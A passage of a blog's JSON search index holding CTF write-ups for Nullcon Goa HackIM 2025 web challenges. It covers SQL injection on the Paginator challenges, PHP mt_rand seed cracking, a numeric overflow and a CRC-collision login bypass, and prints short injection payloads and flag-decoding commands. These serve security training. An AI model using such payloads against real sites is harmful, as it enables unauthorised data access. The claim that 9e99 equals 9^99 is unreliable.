Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit php_mt_seed Seed Cracking 💡 Key Learnings ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:8:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"New Knowledge I have learned that the mt_rand function in PHP is vulnerable because the seed used for random generation can be extracted to gather information. ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:9:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📚 References \u0026 Resources ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:10:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Learning Resources https://www.openwall.com/php_mt_seed/ 📊 Final Statistics Metric Value Notes Time to Solve 00:45 From start to flag Global Ranking (At the time of flag submission) 11/1115 Challenge ranking Points Earned 500 Team contribution Created: 02-02-2025 • Last Modified: 02-02-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/sess.io/:11:0","tags":["🔓 Predictable Session ID Vulnerability","🎲 Mersenne Twister","🌐 Web Security"],"title":"🌐 Sess.io","uri":"/posts/2025/02/07/sess.io/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Paginator V2' from NullCon Goa HackIM CTF - 2025","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":" Challenge Presentation ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:0:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event Nullcon Goa HackIM 2025 CTF Event Link 🔰 Category Web 🌐 💎 Points 500 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 1/10 👤 Author @gehaxelt Profile 🎮 Solves (At the time of flag submission) 194 solve rate 📅 Date 02-02-2025 Nullcon Goa HackIM 2025 CTF 🦾 Solved By mH4ck3r0n3 Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:1:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📝 Challenge Information Ok, we moved the critical information to a different table now… Can’t go wrong this time, right? http://52.59.124.14:5015 ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:2:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:3:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Provided Files Files: None 🔍 Initial Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:3:1","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"First Steps This is version 2 of the challenge Paginator. The website appears as follows: Site Presentation Looking at the source of the page: Source Code I noticed that the flag is no longer present in the pages table, unlike the previous challenge Paginator, so it is no longer possible to view it using OR 1=1 since the query retrieves records from the pages table. Therefore, I thought of using a UNION to perform the injection. ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:4:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:5:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Potential Vulnerabilities SQL Injection 🎯 Solution Path ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:5:1","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Steps ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:6:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Initial setup The first step is to figure out which table contains the flag since it is no longer in the pages table. The first thing that comes to mind is that a table named flag might have been created specifically. ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:6:1","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Indeed, by proceeding with the exploitation and sending /p?=2,10 UNION SELECT * FROM flag, I obtain the row containing the flag in base64 format. Flag Base64 By decoding it: echo RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvd19BZ0Exbl9BbmRfQWc0MW4hfQ== | base64 -d I obtain the flag. ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:6:2","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:6:3","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Approach The exploit sends a request leveraging SQL Injection and extracts the flag from the response text using a regex.  Exploit 🚩 Flag Capture Flag ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:7:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit 💡 Key Learnings ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:8:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📊 Final Statistics Metric Value Notes Time to Solve 00:20 From start to flag Global Ranking (At the time of flag submission) 11/1115 Challenge ranking Points Earned 500 Team contribution Created: 02-02-2025 • Last Modified: 02-02-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator-v2/:9:0","tags":["💉 SQL Injection","💉 Union Based SQL Injection","🌐 Web Security"],"title":"🌐 Paginator V2","uri":"/posts/2025/02/07/paginator-v2/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Paginator' from NullCon Goa HackIM CTF - 2025","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":" Challenge Presentation ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:0:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event Nullcon Goa HackIM 2025 CTF Event Link 🔰 Category Web 🌐 💎 Points 500 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 1/10 👤 Author @gehaxelt Profile 🎮 Solves (At the time of flag submission) 257 solve rate 📅 Date 01-02-2025 Nullcon Goa HackIM 2025 CTF 🦾 Solved By mH4ck3r0n3 Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:1:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📝 Challenge Information There can’t much go wrong with pagination, right? http://52.59.124.14:5012 ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:2:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:3:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Provided Files Files: None 🔍 Initial Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:3:1","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation When I clicked on show pages 2,10, it showed me the rows from the database by setting the parameter p=2,10. Then, I decided to click the link to the source, which directed me to /?source: Source Code I saved the source in the file source.php. As we can see, a QUERY is made that retrieves all the pages by setting a minimum and maximum ID based on the parameter p we pass. Let’s move on to the exploitation. ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:4:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:5:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Potential Vulnerabilities SQL Injection 🎯 Solution Path ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:5:1","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Steps ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:6:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Initial setup As we can notice, there is a check on the minimum value, so when passing /?p=1,10 OR 1=1, I get this post is not accessible. Therefore, I need to bypass that check, perhaps by setting the minimum value to 2, for example. ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:6:1","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Indeed, the exploit payload is exactly as follows: /?p=2,10 OR 1=1. The query would then be: SELECT * FROM pages WHERE id\u003e= 2 AND id\u003c= 10 OR 1=1 By setting the minimum value to 2, we bypass the check. Using OR 1=1 ensures that the query returns all the pages, so the page with the flag will also be displayed. Flag Base64 As we can see from the source, the flag is encoded in base64. So, using the terminal, I perform the decode and obtain the flag: echo \"RU5Pe1NRTDFfVzF0aF8wdVRfQzBtbTRfVzBya3NfU29tZUhvdyF9\" | base64 -d ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:6:2","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:6:3","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Approach The exploit sends the request with the SQL Injection payload as the p parameter, and then it extracts the flag in base64 format using a regex and decodes it.  Exploit 🚩 Flag Capture Flag ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:7:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit 💡 Key Learnings ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:8:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📊 Final Statistics Metric Value Notes Time to Solve 00:02 From start to flag Global Ranking 23/595 Challenge ranking Points Earned 500 Team contribution Created: 01-02-2025 • Last Modified: 01-02-2025 *Author: mH4ck3r0n3 • Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/paginator/:9:0","tags":["💉 SQL Injection","🌐 Web Security"],"title":"🌐 Paginator","uri":"/posts/2025/02/07/paginator/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Numberizer' from NullCon Goa HackIM CTF - 2025","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":" Challenge Presentation ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:0:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event Nullcon Goa HackIM 2025 CTF Event Link 🔰 Category Web 🌐 💎 Points 500 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 1/10 👤 Author @gehaxelt Profile 🎮 Solves (At the time of flag submission) 194 solve rate 📅 Date 01-02-2025 Nullcon Goa HackIM 2025 CTF 🦾 Solved By mH4ck3r0n3 Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:1:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📝 Challenge Information Are you good with numbers? http://52.59.124.14:5004 ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:2:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:3:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Provided Files Files: None 🔍 Initial Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:3:1","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation Let’s take a look at the source code by clicking on the link: Source Code As we can see, it is written in php, and we need to calculate a negative sum in order to access the flag. The numbers entered must be numeric and have a maximum of 4 digits, as we can see from the checks. ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:4:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:5:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Potential Vulnerabilities Integer Overflow 🎯 Solution Path ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:5:1","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Steps ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:6:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Initial setup Here, once we understand that we can exploit an Integer Overflow, by exceeding the maximum number we will cause the overflow, resulting in a negative number. ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:6:1","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation The exploit consists in sending numbers like 9e99, which is equivalent to 9^99. Since the maximum number of digits allowed is 4, by exploiting the exponential notation, we can trigger the integer overflow. Exploit And as a result, we obtain the flag. ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:6:2","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:6:3","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Approach The exploit follows the same procedure mentioned above and extracts the flag using a regex.  Exploit 🚩 Flag Capture Flag ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:7:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit 💡 Key Learnings ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:8:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📊 Final Statistics Metric Value Notes Time to Solve 00:01 From start to flag Global Ranking (At the time of flag submission) 27/686 Challenge ranking Points Earned 500 Team contribution Created: 01-02-2025 • Last Modified: 01-02-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/numberizer/:9:0","tags":["💥 Integer Overflow","🌐 Web Security"],"title":"🌐 Numberizer","uri":"/posts/2025/02/07/numberizer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Crahp' from NullCon Goa HackIM CTF - 2025","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":" Challenge Presentation ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:0:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event Nullcon Goa HackIM 2025 CTF Event Link 🔰 Category Web 🌐 💎 Points 500 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 3/10 👤 Author @gehaxelt Profile 🎮 Solves (At the time of flag submission) 221 solve rate 📅 Date 01-02-2025 Nullcon Goa HackIM 2025 CTF 🦾 Solved By jsnv Team: QnQSec ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:1:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"📝 Challenge Information Oh Crahp, I forgot my credentials! Can you login nontheless? http://52.59.124.14:5006 ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:2:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:3:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Provided Files Files: None 🔍 Initial Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:3:1","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation By taking a look at the source code of the page by clicking on the /?source link: Source Code 2 Source Code 2 I noticed that a CRC (Cyclic Redundancy Check) function is used, so I researched how it works. It is an algorithm that calculates a checksum (a control value) to verify that the data hasn’t been altered during transmission or storage. It works by performing mathematical operations on a string of data, generating a short code that represents the data itself. I then discovered that CRC is not cryptographically secure. The CRC16 and CRC8 functions are designed to detect accidental errors, not to ensure the integrity or security of the data. CRC is linear, predictable, and easily reversible: an attacker can manipulate the data to obtain the same CRC signature. The attack involves finding an alternative password with the same CRC. The code compares two CRC hashes: one of the stored password and one of the password entered by the user. If both the CRC16 and CRC8 values match those of the original password, access is granted. An attacker can generate a different password with the same CRC16 and CRC8 and bypass the check. Having understood this, let’s proceed to the exploitation. ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:4:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:5:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Potential Vulnerabilities CRC (Cyclic Redundancy Check) collision 🎯 Solution Path ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:5:1","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation Steps ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:6:0","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Initial setup The exploitation involves generating a password that has the same checksum as the password AdM1nP@assW0rd!. To do this, we simply need to calculate the CRC16 and CRC8 of the real password (“AdM1nP@assW0rd!”), then generate an alternative string with the same CRC16 and CRC8. Since CRC is linear, there are known techniques (such as manipulating the final bytes) to find collisions. The attacker could use tools like hashclash, brute force, or create a string of the same length as the original password but producing the same checksums. By entering the alternative string, the attacker gains access because the code only verifies the hashes and not the original password → bypass successful! ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:6:1","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Exploitation I wrote a script that does all of this, and I ran it to obtain the password with the same checksum. Afterward, I entered it in the input box and submitted it, which granted me access and, consequently, the flag. ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:6:2","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 Crahp","uri":"/posts/2025/02/07/crahp/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/Nullcon-Goa-HackIM-CTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"07/02/2025","objectID":"/posts/2025/02/07/crahp/:6:3","tags":["💥 CRC Collision","🌐 Web Security"],"title":"🌐 